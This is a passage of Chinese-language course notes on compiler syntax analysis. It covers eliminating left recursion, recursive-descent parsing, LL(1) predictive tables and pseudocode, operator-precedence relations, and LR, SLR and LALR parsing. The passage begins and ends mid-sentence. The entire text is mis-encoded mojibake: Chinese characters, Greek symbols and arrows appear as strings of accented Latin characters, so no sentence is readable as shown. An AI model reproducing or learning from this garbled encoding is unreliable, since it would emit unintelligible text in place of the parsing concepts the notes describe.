·åå¤è¿›è¡Œæå–ç›´åˆ°æ‰€å¼•è¿›çš„æ–°éç»ˆç»“ç¬¦çš„æœ‰å…³äº§ç”Ÿå¼å‡æ— å·¦å…¬å…±å› å­ä¸ºæ­¢ ç»“è®ºï¼šä¸€ä¸ªæ–‡æ³•æå–äº†å·¦å…¬å…±å› å­åï¼Œåªè§£å†³äº†ç›¸åŒå·¦éƒ¨äº§ç”Ÿå¼çš„å³éƒ¨FIRSTé›†ä¸ç›¸äº¤é—®é¢˜ã€‚å½“æ”¹å†™åçš„æ–‡æ³•ä¸å«æœ‰ç©ºäº§ç”Ÿå¼ï¼Œä¸”æ— å·¦é€’å½’æ—¶ï¼Œåˆ™æ”¹å†™åçš„æ–‡æ³•æ˜¯LL(1)æ–‡æ³•ã€‚å¦åˆ™è¿˜éœ€ç”¨LL(1)æ–‡æ³•çš„åˆ¤åˆ«æ–¹æ³•è¿›è¡Œåˆ¤æ–­æ‰èƒ½ç¡®å®šæ˜¯å¦ä¸ºLL(1)æ–‡æ³•ã€‚\nâ…¡æ¶ˆé™¤å·¦é€’å½’ ä¸€ä¸ªæ–‡æ³•å«æœ‰ä¸‹åˆ—å½¢å¼çš„äº§ç”Ÿå¼ä¹‹ä¸€æ—¶ï¼š\n   Aâ†’A Î², AâˆˆVN , Î² âˆˆ V*\n  Aâ†’B Î², Bâ†’A Î±, A,BâˆˆVN, Î± ,Î² âˆˆ V*\n   åˆ™ç§°è¯¥æ–‡æ³•æ˜¯å·¦é€’å½’çš„ã€‚\nå«æœ‰å·¦é€’å½’çš„æ–‡æ³•ä¸èƒ½é‡‡å–è‡ªé¡¶å‘ä¸‹åˆ†ææ³•ã€‚\n1):æŠŠç›´æ¥å·¦é€’å½’æ”¹å†™ä¸ºå³é€’å½’ è®¾æœ‰æ–‡æ³•äº§ç”Ÿå¼: Aâ†’AÎ²|Î³. å…¶ä¸­Î²éç©ºï¼Œ Î³ä¸ä»¥Aæ‰“å¤´ã€‚ å¯å†™ä¸º: A â†’ Î³A' A' â†’ Î²A' | Îµ ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå‡å®šå…³äºAçš„äº§ç”Ÿå¼æ˜¯ï¼š Aâ†’A Î±1| A Î±2 | â€¦ | A Î±m | Î²1 | Î²2 | â€¦| Î²n å…¶ä¸­ï¼ŒÎ±i(1â‰¤iâ‰¤m)å‡ä¸ä¸ºç©ºï¼Œ Î²j(1â‰¤jâ‰¤n)å‡ä¸ä»¥Aæ‰“å¤´ã€‚ åˆ™æ¶ˆé™¤ç›´æ¥å·¦é€’å½’åæ”¹å†™ä¸ºï¼š A â†’ Î²1 A' | Î²2 A' | â€¦ | Î²n A' A'â†’ Î±1 A' | Î±2 A' | â€¦ | Î±m A' | Îµ 2):é—´æ¥æ¶ˆé™¤å·¦é€’å½’ å¯¹äºé—´æ¥å·¦é€’å½’çš„æ¶ˆé™¤éœ€è¦å…ˆå°†é—´æ¥å·¦é€’å½’å˜ä¸ºç›´æ¥å·¦é€’å½’ï¼Œç„¶åå†æŒ‰1)æ¸…é™¤å·¦é€’å½’ å“ªä¸€æ­¥æœ‰å·¦é€’å½’ï¼Œå°±æŠŠé‚£ä¸€æ­¥çš„é—´æ¥å·¦é€’å½’ä»£å…¥äº§ç”Ÿå¼äº§ç”Ÿç›´æ¥å·¦é€’å½’ ---------------------------------------------------- 3):æ¶ˆé™¤æ–‡æ³•ä¸­ä¸€åˆ‡å·¦é€’å½’çš„ç®—æ³• è®¾éç»ˆç»“ç¬¦æŒ‰æŸç§è§„åˆ™æ’åºä¸ºA1, A2,â€¦ An ã€‚ For i:=1 to n do begin For j:=1 to i-1 do begin è‹¥Ajçš„æ‰€æœ‰äº§ç”Ÿå¼ä¸ºï¼š Aj â†’ Î´1 | Î´2 | â€¦ | Î´n æ›¿æ¢å½¢å¦‚Ai â†’ Aj Î³çš„äº§ç”Ÿå¼ä¸ºï¼š Ai â†’ Î´1Î³ | Î´2Î³ | â€¦ | Î´nÎ³ end æ¶ˆé™¤Aiä¸­çš„ä¸€åˆ‡ç›´æ¥å·¦é€’å½’ end é€’å½’ä¸‹é™åˆ†æç¨‹åºæ„é€  åœ¨ç¨‹åºè¯­è¨€çš„è¯­æ³•å®šä¹‰ä¸­æœ‰è®¸å¤šé‡‡ç”¨é€’å½’å®šä¹‰ã€‚æˆ‘ä»¬åœ¨å¯¹å®ƒè¿›è¡Œè¯­æ³•åˆ†ææ—¶ï¼Œç¼–åˆ¶çš„å¤„ç†ç¨‹åºä¹Ÿé‡‡å–é€’å½’çš„æ–¹å¼ï¼Œå¯ä½¿å…¶ç»“æ„ç®€å•æ˜“è¯»ã€‚ä½†ç”±äºé¢‘ç¹åœ°è°ƒç”¨å­ç¨‹åºå¤§å¤§åœ°é™ä½äº†åˆ†æé€Ÿåº¦\nä¸»è¦æ€æƒ³ï¼šå¯¹æ¯ä¸ªéç»ˆç»“ç¬¦æŒ‰å…¶äº§ç”Ÿå¼ç»“æ„å†™å‡ºç›¸åº”çš„è¯­æ³•åˆ†æå­ç¨‹åºã€‚å› ä¸ºæ¯ä¸ªæ–‡æ³•é€’å½’ç›¸åº”å­ç¨‹åºä¹Ÿé€’å½’ï¼Œå­ç¨‹åºçš„ç»“æ„ä¸äº§ç”Ÿå¼ç»“æ„ä¸€è‡´ã€‚æ‰€ä»¥ç§°æ­¤ç§æ–¹æ³•ç§°ä¸ºé€’å½’å­ç¨‹åºæ³•æˆ–é€’å½’ä¸‹é™æ³•ã€‚\nç”¨ç¨‹åºè¡¨ç¤ºé€’å½’å­ç¨‹åºçš„å†…éƒ¨ç»“æ„ï¼š\n\tè®¾Aæ˜¯ä¸€ä¸ªéç»ˆç»“ç¬¦ï¼šAâ†’Î²1 Aâ†’Î²2 â”Š Aâ†’Î²n åˆ™å†™ Î¶(A) \u003c==\u003e if charâˆˆfirst(Î²1 ) thenÎ¶(Î²1 ) else if char âˆˆ first(Î²2 ) then Î¶(Î²2 ) elseâ€¦ if charâˆˆfirst(Î²n ) then Î¶(Î²n) else ERROR å…¶ä¸­Î¶(Î²i)è¡¨ç¤ºè°ƒç”¨å¤„ç†ç¬¦å·ä¸²Î²içš„å­ç¨‹åºã€‚ å¯¹Açš„ä»»ä¸€å³éƒ¨i è®¾ä¸ºï¼š Î²i = y1 y2 â€¦ yn åˆ™å®šä¹‰Î¶( Î²i) \u003c==\u003e beginÎ¶(y1);Î¶(y2);â€¦;Î¶(yn) end å…¶ä¸­yjå¯åˆ†ä¸ºä¸‹åˆ—ä¸¤ç§æƒ…å†µï¼ˆj=1,â€¦,n): 1) yjâˆˆVT,åˆ™ Î¶( yj) \u003c==\u003e if charâ‰  yj then ERROR else READ(char) 2) yjâˆˆVN,åˆ™Î¶(yj)è¡¨ç¤ºè°ƒç”¨å…³äºyjçš„é€’å½’å­ç¨‹åºã€‚ å¯¹æ–‡æ³•åŠ é™åˆ¶ï¼š 1.ä»»ä¸€éç»ˆç»“ç¬¦Béƒ½ä¸æ˜¯å·¦é€’å½’çš„ï¼Œå¦åˆ™ä¼šäº§ç”Ÿæ­»å¾ªç¯ã€‚ 2.å¯¹Açš„ä»»æ„ä¸¤ä¸ªå³éƒ¨Î²i , Î²j ,æœ‰ï¼šfirst(Î²i) âˆ© first(Î²j) = Ï† , First(Î²i)è¡¨ç¤ºÎ²iæ‰€èƒ½å¯¼å‡ºä¸²çš„ç¬¬ä¸€ä¸ªç¬¦å·çš„é›†åˆã€‚æ˜¾ç„¶ï¼Œæ¯ä¸ªÎ²içš„first(Î²i)æ˜¯äº’ä¸ç›¸åŒçš„ï¼Œå¦åˆ™åˆ™æ— æ³•åˆ¤æ–­åº”æ‰§è¡Œå“ªä¸ªÎ¶(Î²i )ã€‚ é¢„æµ‹åˆ†æç¨‹åº LL(k)æ–‡æ³•æ˜¯é‡‡å–ç¡®å®šçš„è‡ªå·¦è‡³å³æ‰«æï¼ˆè¾“å…¥ä¸²ï¼‰å’Œè‡ªé¡¶å‘ä¸‹åˆ†ææŠ€æœ¯çš„æœ€å¤§ä¸€ç±»æ–‡æ³•ã€‚\nLLç³»æŒ‡ï¼šè‡ªå·¦å‘å³æ‰«æï¼ˆè¾“å…¥ä¸²ï¼‰ï¼Œè‡ªä¸Šè€Œä¸‹è¿›è¡Œæœ€å·¦æ¨å¯¼ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œä¸€ä¸ªæ–‡æ³•å½“å…¶åˆ†æå™¨å¯¹è¾“å…¥ä¸²è¿›è¡Œè‡ªå·¦è‡³å³æ‰«æå¹¶é‡‡ç”¨è‡ªé¡¶å‘ä¸‹æ–¹æ³•è¿›è¡Œåˆ†æçš„è¿‡ç¨‹ä¸­ï¼Œå¦‚æœæ¯æ­¥ä»…åˆ©ç”¨å½“å‰çš„éç»ˆç»“ç¬¦ï¼ˆäº‹å®ä¸Šæ­¤æ—¶å®ƒå·²ä½äºåˆ†ææ ˆé¡¶ï¼‰å’Œè‡³å¤šå‘å‰æŸ¥çœ‹kä¸ªè¾“å…¥ç¬¦å·å°±èƒ½å”¯ä¸€ å†³å®šé‡‡å–ä»€ä¹ˆåŠ¨ä½œï¼Œé‚£ä¹ˆè¿™ä¸ªæ–‡æ³•ç§°ä¸ºLL(K)æ–‡æ³•ã€‚\nå¯¹äºå¤§å¤šæ•°ç¨‹åºè®¾è®¡è¯­è¨€è€Œè¨€ã€‚K=1å°±è¶³å¤Ÿäº†ã€‚å› æ­¤æˆ‘ä»¬å°†ä¸»è¦è®¨è®ºk=1çš„æƒ…å½¢ã€‚\nLL(1)æ–‡æ³•çš„åˆ†æè¿‡ç¨‹ è®¾åˆ†æçš„å½“å‰æ ¼å±€ä¸ºï¼ˆx1x2 â€¦. xn#, y1y2 â€¦. ym#)\nå…¶ä¸­xiè¡¨ç¤ºå¥å‹çš„å‰ç«¯éƒ¨åˆ†ï¼Œè¯¸yjè¡¨ç¤ºè¾“å…¥æµçš„åç«¯éƒ¨åˆ†ï¼ˆç»ˆç»“ç¬¦ä¸²ï¼‰ã€‚åˆ™å¯èƒ½æœ‰ä¸‹è¿°åŠ¨ä½œä¹‹ä¸€ï¼š\n1.æ›¿ä»£ï¼šå½“x1âˆˆVNæ—¶ï¼Œåˆ™é€‰ç›¸åº”çš„å€™é€‰å¼å»æ›¿æ¢x1 ã€‚\n2.åŒ¹é…ï¼šå½“x1âˆˆVTæ—¶ï¼Œå®ƒä¸y1è¿›è¡ŒåŒ¹é…ï¼Œå…¶ç»“æœä¸ºä¸¤ç§å¯èƒ½ï¼Œå¦‚\næœåŒ¹é…æˆåŠŸï¼Œåˆ™å»æ‰x1å’Œy1ï¼ˆå³æŒ‡é’ˆåç§»ä¸€ä½ï¼‰å¦åˆ™æŠ¥é”™ã€‚\n3.æ¥å—ï¼šå½“æ ¼å±€ä¸º(#, #ï¼‰æ—¶ï¼ŒæŠ¥å‘Šåˆ†ææˆåŠŸç»“æŸã€‚\nä»å®ç°çš„è§’åº¦æ¥è¯´ï¼Œä¸Šè¿°æ›¿æ¢è¿‡ç¨‹éœ€è¦èŠ±è¾ƒå¤šçš„æ—¶é—´ï¼Œå› ä¸ºå®ƒé™¤äº†æŠŠä¸€ä¸ªå€™é€‰å¼æ›¿æ¢æ‰x1,è¿˜éœ€è¦x2 â€¦ xnç»Ÿç»Ÿè¿›è¡Œç§»ä½å¤„ç†ï¼Œè¿™æ—¶å¾ˆéº»çƒ¦çš„ã€‚æˆ‘ä»¬çš„å¤„ç†æ–¹æ³•æ˜¯ç”¨æ ˆæ¥ä¿å­˜x1x2 â€¦ xn,è€Œä¸”æ˜¯æŠŠxnä½œä¸ºæ ˆåº•ï¼Œ x1ä½œä¸ºæ ˆé¡¶ï¼Œé‚£ä¹ˆä¸Šè¿°çš„æ›¿æ¢åŠ¨ä½œå°±ç®€å•äº†ï¼Œåªéœ€åœ¨æ ˆé¡¶è¿›è¡Œæ›¿æ¢ã€‚å³å»æ‰x1æŠŠå€™é€‰å¼çš„ç¬¦å·ä¸²æŒ‰é€†åºæ–¹å¼å‹å…¥æ ˆä¸­å³å¯ã€‚\nLL(1)æ–¹æ³•çš„å®ç° LL(1)æ–¹æ³•åœ¨å®ç°æ—¶ç”¨åˆ°ä¸€ä¸ªLL(1)åˆ†æçŸ©é˜µå’Œä¸€ä¸ªåˆ†ææ ˆä»¥åŠé¢„æµ‹åˆ†æç¨‹åºã€‚\nåˆ†æçŸ©é˜µçš„å…ƒç´ M[A,a]ä¸­çš„ä¸‹æ ‡Aä¸ºéç»ˆç»“ç¬¦ï¼Œaä¸ºç»ˆç»“ç¬¦æˆ–å¥å­ç»“æŸæ ‡è®°\"#\"ï¼ŒçŸ©é˜µå…ƒç´ M[A,a]çš„å†…å®¹ä¸ºä¸€æ¡å…³äºAçš„äº§ç”Ÿå¼ã€‚\nå®ƒè¡¨æ˜å½“ç”¨éç»ˆç»“ç¬¦Aå‘ä¸‹æ¨å¯¼è€Œå½“å‰è¾“å…¥ç¬¦ä¸ºaæ—¶ï¼Œæ‰€åº”é‡‡ç”¨çš„å€™é€‰å¼ã€‚å½“çŸ©é˜µå…ƒç´ ä¸ºç©ºæ—¶ï¼Œåˆ™è¡¨ç¤ºç”¨Aå¾€ä¸‹æ¨å¯¼æ—¶é‡åˆ°äº†ä¸åº”è¯¥å‡ºç°çš„ç¬¦å·ï¼Œå³Aä¸aä¸èƒ½åŒ¹é…ã€‚å› æ­¤åº”è¯¥è½¬å‘å‡ºé”™å¤„ç†ã€‚\né¢„æµ‹åˆ†æç¨‹åºå¦‚ä¸‹å›¾\nâ‘ åˆ¤æ–­æ–‡æ³•G[E]æ˜¯å¦ä¸ºLL(1)æ–‡æ³•ï¼Œè‹¥æ–‡æ³•ä¸­å«æœ‰å·¦é€’å½’é‚£ä¹ˆè¦å…ˆæ¶ˆé™¤å·¦é€’å½’ï¼Œç„¶åæ±‚selecté›†\nâ‘¡æ„é€ é¢„æµ‹åˆ†æè¡¨ï¼Œå¯¹æ¯ä¸ªç»ˆç»“ç¬¦æˆ–'#'å·ç”¨aè¡¨ç¤ºï¼Œåˆ™è‹¥aâˆˆSelect(Aâ†’Î±)ã€‚ä»¤ M[A,a]=Aâ†’Î±\næŠŠæ‰€æœ‰æ— å®šä¹‰çš„M[A,a]æ ‡ä¸ŠERROR\nä¼ªä»£ç å¦‚ä¸‹ï¼š\nå…¶ç¨‹åºç»´æŠ¤ä¸€ä¸ªæ ˆStackç”¨æ¥å‚¨å­˜éç»ˆç»“ç¬¦ï¼Œä¸€ä¸ªç”¨äºå‚¨å­˜æºç¨‹åºçš„è¯»å…¥å­—ç¬¦å˜é‡aï¼Œä¸€ä¸ªç”¨äºå‚¨å­˜æ ˆé¡¶å…ƒç´ XX å…¶ä¸­M[A,a] = {X-\u003ex1x2â€¦â€¦xk} ä¸º Select(X-\u003ex1x2â€¦â€¦xk)={a,â€¦â€¦},Xä¸ºéç»ˆç»“ç¬¦,aä¸ºç»ˆç»“ç¬¦ #å’Œå¼€å§‹ç¬¦åˆå…¥æ ˆ æŠŠç¬¬ä¸€ä¸ªè¾“å…¥ç¬¦å·è¯»å…¥a Flag := True while Flag Do: æŠŠæ ˆé¡¶å…ƒç´ å‡ºæ ˆåˆ°Xä¸­ if X âˆˆ VT then if X = a then æŠŠä¸‹ä¸€ä¸ªè¾“å…¥ç¬¦å·è¯»å…¥a else ERROR else if X = '#' then Flag := False else ERROR else if M[X,a] = {X-\u003ex1x2x3â€¦â€¦Xxk} then æŠŠx1x2x3â€¦â€¦xkå…¥æ ˆ else ERROR END of while STOP/*åˆ†ææˆåŠŸï¼Œè¿‡ç¨‹å®Œæ¯•*/ è‡ªåº•å‘ä¸Šè¯­æ³•åˆ†æ åŸç†ï¼šè‡ªå·¦å‘å³æ‰«æï¼Œè‡ªä¸‹è€Œä¸Šåˆ†æ\nä»è¾“å…¥ç¬¦å·ä¸²å…¥æ‰‹ï¼Œé€šè¿‡åå¤æŸ¥æ‰¾å½“å‰å¥å‹çš„å¯å½’çº¦ä¸²ï¼Œå¹¶ä½¿ç”¨æ–‡æ³•çš„äº§ç”Ÿå¼æŠŠä»–å½’çº¦æˆç›¸åº”çš„éç»ˆç»“ç¬¦æ¥ä¸€æ­¥æ­¥åœ°è¿›è¡Œåˆ†æã€‚æœ€ç»ˆæŠŠè¾“å…¥ä¸²å½’çº¦æˆæ–‡æ³•çš„å¼€å§‹ç¬¦å·ï¼Œè¡¨æ˜åˆ†ææˆåŠŸã€‚\n ä»»ä½•è‡ªä¸‹è€Œä¸Šåˆ†ææ–¹æ³•çš„å…³é”®å°±æ˜¯è¦æ‰¾å‡ºå½“å‰å¥å‹çš„å¯å½’çº¦ä¸²ï¼Œç„¶åæ ¹æ®äº§ç”Ÿå¼åˆ¤åˆ«å°†å®ƒå½’çº¦æˆä»€ä¹ˆæ ·çš„éç»ˆç»“ç¬¦ã€‚  è§„èŒƒå½’çº¦åŸºæœ¬æ¦‚å¿µ Gä¸ºæ–‡æ³•ï¼ŒSä¸ºå¼€å§‹ç¬¦å·ï¼Œå‡å®šÎ±ï¼ŒÎ²ï¼ŒÎ´æ˜¯Gçš„ä¸€ä¸ªå¥å‹ï¼Œå¦‚æœ S =*=\u003e Î±AÎ´ ä¸” A=+=\u003e Î²ï¼Œ\nåˆ™ç§° Î² æ˜¯å¥å‹ Î± Î² Î´ ç›¸å¯¹äºéç»ˆç»“ç¬¦Açš„çŸ­è¯­ã€‚\nå¦‚æœ A â‡’ Î² ï¼Œåˆ™ç§°Î²æ˜¯å¥å‹ Î± Î² Î´ ç›¸å¯¹äºAçš„ç›´æ¥çŸ­è¯­ã€‚\næœ€å·¦ç›´æ¥çŸ­è¯­ç§°ä¸ºå¥æŸ„ã€‚\nä»å¥å­åˆ°å¼€å§‹ç¬¦å·çš„å½’çº¦åºåˆ—ï¼Œå¦‚æœæ¯ä¸€æ­¥éƒ½æ˜¯æŠŠå¥æŸ„æ›¿æ¢ä¸ºç›¸åº”äº§ç”Ÿå¼çš„å·¦éƒ¨ç¬¦å·è€Œå¾—åˆ°çš„ï¼Œåˆ™ç§°ä¸ºè§„èŒƒå½’çº¦ã€‚è§„èŒƒå½’çº¦æ˜¯æœ€å³æ¨å¯¼ï¼ˆè§„èŒƒæ¨å¯¼ï¼‰çš„é€†è¿‡ç¨‹ã€‚\n ä¾‹ï¼šï¼šè€ƒè™‘æ–‡æ³•G(E)ï¼šEâ†’E +T |T Tâ†’T*F | F Fâ†’i| (E) å¹¶å‡å®šè¾“å…¥ä¸²ä¸ºï¼ˆi+i)*iï¼Œè€ƒå¯Ÿè‡ªä¸‹è€Œä¸Šçš„åˆ†æè¿‡ç¨‹\næ ˆä¸Šçš„å€™é€‰å¼ä¸ä¸€å®šæ˜¯å¥æŸ„ã€‚ä¾‹å¦‚ï¼Œåœ¨ç¬¬14æ­¥å¯¹æ ˆé¡¶ä¸ºTï¼Œå®ƒæ˜¯Eçš„ä¸€å€™é€‰å¼ï¼Œä½†å®ƒä¸æ˜¯å¥æŸ„ï¼Œä¸èƒ½å½’çº¦æˆEã€‚åˆ¤å®šå€™é€‰å¼æ˜¯æä¸ºç®€å•çš„äº‹æƒ…ï¼Œä½†åˆ¤å®šå¥æŸ„å°±ä¸é‚£ä¹ˆå®¹æ˜“ã€‚è€Œä¸åŒçš„è‡ªåº•å‘ä¸Šæ–¹æ³•ç»™å‡ºä¸åŒçš„åˆ¤å®šæ–¹æ³•ã€‚\n è‡ªä¸‹è€Œä¸Šæ–¹æ³•åŒ…æ‹¬å››ä¸ªæ–¹æ³•ï¼š\n ç§»è¿›(shift)ï¼šæŠŠè¾“å…¥æµçš„å¤´ç¬¦è¯»åˆ°åˆ†ææ ˆä¸­ å½’çº¦(Reduction)ï¼šæŠŠåˆ†ææ ˆé¡¶çš„å¥æŸ„å½’çº¦ä¸ºä¸€éç»ˆç»“ç¬¦ æ¥å—ï¼šåˆ†ææˆåŠŸ æŠ¥é”™ï¼šå¤„ç†é”™è¯¯  ç®—ç¬¦ä¼˜å…ˆåˆ†æ é¦–å…ˆè§„å®šæ–‡æ³•ç¬¦å·ä¹‹é—´çš„ä¼˜å…ˆå…³ç³»å’Œç»“åˆæ€§è´¨ï¼Œç„¶åå†åˆ©ç”¨è¿™ç§å…³ç³»ï¼Œé€šè¿‡æ¯”è¾ƒä¸¤ä¸ªç›¸é‚»çš„ç¬¦å·ä¹‹é—´çš„ä¼˜å…ˆé¡ºåºæ¥ç¡®å®šå¯å½’çº¦ä¸²ã€‚\nç®—ç¬¦æ–‡æ³•ï¼šä»»ä½•äº§ç”Ÿå¼çš„å³éƒ¨éƒ½ä¸å«ä¸¤ä¸ªç›¸ç»§çš„éç»ˆç»“ç¬¦\n ä¼˜å…ˆå…³ç³»ï¼š\nç»ˆç»“ç¬¦abçš„ä¸‰ç§ä¼˜å…ˆå…³ç³»ï¼š\n a = bï¼šå½“ä¸”ä»…å½“å­˜åœ¨å½¢å¦‚ä¸‹é¢çš„äº§ç”Ÿå¼ U â†’ â€¦ ab â€¦ æˆ– U â†’ â€¦aQb â€¦ a \u003c bï¼šå½“ä¸”ä»…å½“å­˜åœ¨å½¢å¦‚ä¸‹é¢çš„äº§ç”Ÿå¼ U â†’ â€¦aWâ€¦ çš„äº§ç”Ÿå¼ï¼Œä¸”æœ‰ W =+=\u003e bâ€¦ a \u003e bï¼šå½“ä¸”ä»…å½“å­˜åœ¨å½¢å¦‚ä¸‹é¢çš„äº§ç”Ÿå¼ U â†’ â€¦Vbâ€¦ çš„äº§ç”Ÿå¼ï¼Œä¸”æœ‰ V=+=\u003eâ€¦a æˆ– V =*=\u003eâ€¦aQ   å¦‚ä½•ä»æ–‡æ³•æ„é€ ä¼˜å…ˆå…³ç³»è¡¨ æ£€æŸ¥æ–‡æ³•äº§ç”Ÿå¼çš„æ¯ä¸ªå€™é€‰ï¼Œå¯æ‰¾å‡ºæ‰€æœ‰æ»¡è¶³ = çš„ç»ˆç»“ç¬¦å¯¹ã€‚\nå¯¹äºæ¯ä¸ªéç»ˆç»“ç¬¦ P æ„é€ ä¸¤ä¸ªé›†åˆ FIRSTVT(P) å’Œ LASTVT(P)\nFisrtVt(P) = { a | P =+=\u003e aâ€¦ æˆ– P =+=\u003e Qaâ€¦ ï¼Œa âˆˆ VT ï¼ŒQ âˆˆ VN  }\nLastVt(P) = { a | P =+=\u003e â€¦a æˆ– P =+=\u003e â€¦aQ ï¼ŒaâˆˆVT ï¼ŒQ âˆˆ VN }\næ£€æŸ¥æ¯ä¸ªäº§ç”Ÿå¼çš„å€™é€‰ï¼Œè‹¥å½¢å¦‚ â€¦aPâ€¦ ï¼Œåˆ™å¯¹ä»»æ„b âˆˆ FisrtVt(P) ï¼Œæˆ‘ä»¬æœ‰ a\u003cb\nè‹¥å½¢å¦‚ â€¦Pbâ€¦ ï¼Œåˆ™å¯¹ä»»ä½•a âˆˆ LastVt(P)ï¼Œæˆ‘ä»¬æœ‰ a\u003eb\nå¯¹è¡¨è¾¾å¼æ–‡æ³•çš„éç»ˆç»“ç¬¦æ„é€  FirstVt å’Œ LastVt å¹¶å»ºç«‹ä¼˜å…ˆå…³ç³»è¡¨\nç®—ç¬¦ä¼˜å…ˆåˆ†æç®—æ³• ç´ çŸ­è¯­ï¼šè¿™æ ·çš„ä¸€ä¸ªçŸ­è¯­ï¼Œä»–è‡³å°‘åŒ…å«ä¸€ä¸ªç»ˆç»“ç¬¦ï¼Œä¸å«æ¯”è‡ªèº«æ›´å°çš„ç´ çŸ­è¯­\næœ€å·¦ç´ çŸ­è¯­ï¼šå¥å‹æœ€å·¦è¾¹çš„ç´ çŸ­è¯­\nå®šç†ï¼šç®—æ³•ä¼˜å…ˆæ–‡æ³•çš„å¥å‹ #N1a1N2a2â€¦â€¦NnanNn+1# çš„æœ€å·¦ç´ çŸ­è¯­æ˜¯æ»¡è¶³å¦‚ä¸‹æ¡ä»¶çš„æœ€å·¦å­ä¸² Njajâ€¦â€¦NiaiNi+1 ï¼Œ aj-1 \u003c aj ï¼Œ aj = aj+1 = ai ï¼Œ ai \u003e ai+1\nä¼˜å…ˆå‡½æ•° LRåˆ†ææ³•  LR(K)åˆ†ææ˜¯æŒ‡è‡ªå·¦å‘å³æ‰«æå’Œè‡ªä¸‹è€Œä¸Šçš„è¯­æ³•åˆ†æï¼Œä¸”åœ¨åˆ†æçš„æ¯ä¸€æ­¥ï¼Œåªé¡»æ ¹æ®åˆ†ææ ˆä¸­å½“å‰å·²ç§»è¿›å’Œå½’çº¦å‡ºçš„å…¨éƒ¨æ–‡æ³•ç¬¦å·ï¼Œå¹¶è‡³å¤šå†å‘å‰æŸ¥çœ‹Kä¸ªè¾“å…¥ç¬¦å·ï¼Œå°±èƒ½ç¡®å®šç›¸å½“äºæŸä¸€äº§ç”Ÿå¼å³éƒ¨ç¬¦å·çš„å¥æŸ„æ˜¯å¦å·²åœ¨åˆ†ææ ˆçš„é¡¶éƒ¨å½¢æˆã€‚ä»è€Œä¹Ÿå°±å¯ä»¥ç¡®å®šæ‰€åº”é‡‡å–çš„åˆ†æåŠ¨ä½œï¼ˆæ˜¯ç§»è¿›è¾“å…¥ç¬¦å·è¿˜æ˜¯æŒ‰æŸäº§ç”Ÿå¼è¿›è¡Œå½’çº¦ï¼‰ã€‚   # X1X2 â€¦â€¦ Xi â€¦â€¦ Xn Xn+1 Xn+2 â€¦â€¦ Xn+k Xn+k+1 â€¦â€¦ # |-------||----------------| æ ˆé¡¶ æ‰«æå™¨çš„ç¼“å†²åŒº æ‰«åˆ°Xn+1,å‘å‰æŸ¥çœ‹kä¸ªç¬¦å·,æ¥ç¡®å®šæ˜¯æŠŠXn+1ç§»è¿›æ ˆ,è¿˜æ˜¯æŠŠXiâ€¦Xnä½œä¸ºå¥æŸ„è¿›è¡Œå½’çº¦ 1) è¦å½’çº¦æ—¶ï¼Œåˆ™æ ¹æ®æŸäº§ç”Ÿå¼ U â†’ XiXi+1â€¦â€¦Xn è¿›è¡Œå½’çº¦: #X1X2 â€¦â€¦ Xi-1 U Xn+1Xn+2 â€¦â€¦ Xn+k â€¦â€¦ # 2)è¦ç§»è¿›æ—¶ï¼Œå³æŠŠXn+1è¿›æ ˆï¼Œå¹¶è¯»å…¥ä¸‹ä¸€ç¬¦å·: #X1X2 â€¦â€¦ Xi â€¦â€¦ XnXn+1 Xn+2 â€¦â€¦ Xn+k â€¦â€¦ # |---|\t|---| |-| æ ˆä¸­Xi æ ˆé¡¶(Xn+1) å½“å‰æ‰«æç¬¦(Xn+2)  LR(0)ï¼šè¡¨ç¤ºå†æ¯ä¸€æ­¥åˆ†ææ—¶éƒ½ä¸ç”¨å‘å‰è¾“å…¥ç¬¦å· LR(1)ï¼šè¡¨ç¤ºå†æ¯ä¸€æ­¥åˆ†ææ—¶éƒ½å‘å‰çœ‹ä¸€ä¸ªè¾“å…¥ç¬¦å·æ¥å†³å®šå½“å‰çš„åŠ¨ä½œ SLR(1)ï¼šè¡¨ç¤ºç®€å•çš„LR(1)ï¼Œå³åªåœ¨åŠ¨ä½œä¸å”¯ä¸€çš„åœ°æ–¹å‘å‰çœ‹ä¸€ä¸ªç¬¦å·ï¼Œåœ¨åŠ¨ä½œå”¯ä¸€æ—¶åˆ™ä¸å‘å‰çœ‹è¾“å…¥ç¬¦å·  LRåˆ†æå™¨çš„é€»è¾‘ç»“æ„åŠå·¥ä½œæµç¨‹ å¦‚å›¾ä¸ºLRåˆ†æå™¨çš„é€»è¾‘ç»“æ„ï¼Œæ‰€æœ‰LRåˆ†æå™¨çš„æ€»æ§ç¨‹åºå¤§è‡´ç›¸åŒï¼Œåªæœ‰åˆ†æè¡¨ï¼ˆå³Go-Actionè¡¨ï¼‰ä¸ç›¸åŒã€‚\n è§„èŒƒLRåˆ†æè¡¨æ„é€ æ³•ï¼šç”¨æ­¤æ³•æ„é€ çš„åˆ†æè¡¨åŠŸèƒ½æœ€å¼ºè€Œä¸”ä¹Ÿé€‚åˆå¾ˆå¤šæ–‡æ³•ï¼Œä½†æ˜¯å®ç°ä»£ä»·è¾ƒé«˜ ç®€å•LRï¼ˆå³SLRï¼‰åˆ†æè¡¨æ„é€ æ³•ï¼šæ¯”è¾ƒå®¹æ˜“å®ç°çš„æ–¹æ³•ï¼Œä½†SLRåˆ†æè¡¨åŠŸèƒ½å¤ªå¼±ï¼Œè€Œä¸”å¯¹æŸäº›æ–‡æ³•å¯èƒ½æ ¹æœ¬å°±æ„é€ ä¸å‡ºç›¸åº”çš„SLRåˆ†æè¡¨ å‘å‰LRï¼ˆå³LALRï¼‰åˆ†æè¡¨æ„é€ æ³•ï¼šè¿™ç§æ–¹æ³•æ„é€ çš„åˆ†æè¡¨åŠŸèƒ½ä»‹äºè§„èŒƒLRåˆ†æè¡¨å’ŒSLRåˆ†æè¡¨ä¹‹é—´ã€‚è¿™ç§è¡¨é€‚ç”¨äºç»å¤§å¤šæ•°çš„ç¨‹åºè¯­è¨€æ–‡æ³•ï¼Œè€Œä¸”ä¹Ÿå¯ä»¥è®¾æ³•æœ‰æ•ˆå®ç°  LRçš„åˆ†æè¿‡ç¨‹ ä¸¤ä¸ªæ ˆï¼šçŠ¶æ€æ ˆï¼Œç¬¦å·æ 